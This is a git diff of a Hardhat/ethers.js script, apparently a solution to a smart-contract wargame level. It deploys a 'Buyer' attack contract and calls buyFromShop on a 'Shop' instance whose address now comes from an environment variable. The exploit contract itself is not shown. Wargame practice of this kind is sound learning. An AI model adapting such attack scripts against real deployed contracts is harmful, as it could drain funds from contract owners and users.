@@ -4,8 +4,7 @@ import { ethers } from "hardhat";
 
 const attackShop = async () => {
     // change contract addresses here.
-    const _shopAddr /*Shop instance address*/ = "0x36Db16f376127CfBCDD77F672B9aB77CF8F127b0";
-    const attackShopBuyerAddress = "0xd643B0403958543e445e16dC720566E0D7e11f8a";
+    const _shopAddr /*Shop instance address*/ = process.env.SHOP!;
     const args: any[] = [];
     const deployer = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
@@ -19,9 +18,9 @@ const attackShop = async () => {
     // const deployed = await deployContract(hre, "Buyer", args);
     // alternative below
     console.log("Deploying attack contract Buyer...");
-    const buyer = await (await ethers.getContractFactory("Buyer", deployer)).deploy();
-    console.log(buyer);
-    console.log(`Attack contract deployed to ${buyer.address}`);
+    const attack = await (await ethers.getContractFactory("Buyer", deployer)).deploy();
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (buyer.address){
     //     console.log("Verifying contract...");
@@ -47,7 +46,6 @@ const attackShop = async () => {
     let price = (await contract.price()).toString();
     console.log(`Current price is: ${price}`);
     console.log("Attacking with malisciuos contract...");
-    const attack = await ethers.getContractAt("Buyer", attackShopBuyerAddress); //buyer
     const tx = await attack.buyFromShop(_shopAddr);
     const txReceipt = tx.wait(1);
     console.log(txReceipt);
